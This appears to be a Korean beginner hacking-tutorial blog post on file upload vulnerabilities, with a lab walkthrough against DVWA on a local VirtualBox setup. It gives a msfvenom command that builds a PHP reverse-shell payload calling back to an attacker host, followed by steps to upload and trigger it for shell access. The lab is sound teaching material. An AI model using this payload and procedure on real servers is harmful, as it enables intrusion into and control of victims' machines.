---
layout: post
title: '[해킹 기초] 8. 파일업로드 취약점 공격'
date: '2022-12-30 11:59:10 +0900'
description: '파일업로드 취약점'
categories: [HACKING,HACKING - Part.2]
image: /assets/img/1/hacking.png
tags: [hacking]
toc: true
---
<a text-size="1px" target="_blank" href="https://icons8.com/icon/5503/hacking">Hacking</a> icon by <a target="_blank" href="https://icons8.com">Icons8</a>

### <b>■ 파일업로드 취약점이란?</b>
파일을 업로드 할 수 있는 웹 사이트에 확장자 필터링이 미흡할 경우, 공격자가 악성 파일을 업로드하여 웹 쉘을 장악할 수 있는 취약점이다.

### <b>■ 파일업로드 취약점 공격 실습</b>
- [실습 환경]
    - Virtual Box(Kali Linux)
    - Virtual Box(DVWA) -공격 대상

파일업로드 취약점 공격을 할 때 악성 코드는 kali linux에 Msfvenom을 사용할 것이다.
여기서 Msfvenom은 공격할 때 사용하는 악성 쉘 코드를 만들어주는 기능을 한다.

<img src="/assets/img/hacking/part2-2/1.png" alt="표사진"><br>

&#35; msfvenom -p php/reverse_php LHOST=[Listen하는 IP 즉 공격자 IP] LPORT=7777 -f raw > shell.php
ex) &#35; msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=7777 -f raw > shell.php<br>
- -p php/reverse_php: 악성 페이로드를 뜻하고 reverse_php 사용한다고 정의했다. reverse_php는 reverse shell 이 포함된 php이다.
 - 여기서 페이로드는 전송되는 데이터를 뜻하고 reverse 쉘은 공격자가 리스닝을 하고 클라이언트가 접속하는 형태를 말한다. 그래서 LHOST에 공격자 IP를 넣는다.
- -LHOST : 위에서 말했듯이 reverse shell 공격이므로 리스닝 하고 있는 호스트를 의미한다.
- -LPORT : Listen Port 7777번 포트를 연다는 의미이다. 
- -f raw : 출력 파일 포맷을 의미하고 shell.php로 악성코드를 저장한다는 의미이다.

위 명령어로 shell.php파일을 만들었으면 이제 공격자 PC에서 포트를 열어주자. 포트를 열어야 클라이언트가 접속할 수 있기 때문이다.<br>
<img src="/assets/img/hacking/part2-2/6.png" alt="표사진"><br>

포트까지 잘 열었으면 이제 업로드 하러 가보자.<br>

<img src="/assets/img/hacking/part2-2/2.png" alt="표사진"><br>
DVWA 사이트에 들어가서 security를 low로 설정해준뒤 왼쪽 메뉴에서 Upload로 들어간다.

<img src="/assets/img/hacking/part2-2/3.png" alt="표사진"><br>
Upload 페이지에 들어가서 Browse를 클릭해서 위에서 만든 shell.php를 업로드 해준다.

<img src="/assets/img/hacking/part2-2/4.png" alt="표사진"><br>
업로드를 했으면 Upload 버튼 아래에 ../../hackable/uploads/ 경로에 shell.php 파일이 잘 업로드 됐다고 나온다.

<img src="/assets/img/hacking/part2-2/5.png" alt="표사진"><br>
../../hackable/uploads/shell.php 경로를 복사한 뒤 현재 페이지 주소 뒤에 붙여넣는다.

<img src="/assets/img/hacking/part2-2/7.png" alt="표사진"><br>
주소에 위 경로를 붙여넣고 아까 nc 명령어를 실행한 cmd 창으로 가면 위와 같이 연결됐다고 나온다. 여기서 공격자가 웹 쉘을 획득한 것이다.

<img src="/assets/img/hacking/part2-2/8.png" alt="표사진"><br>
위와 같이 웹 쉘을 획득한 상태에서 피해자 컴퓨터에 명령어 사용이 가능한다. 여러 명령어를 사용해 피해자 컴퓨터를 조종할 수 있으며 여러 중요한 파일들도 볼 수 있다.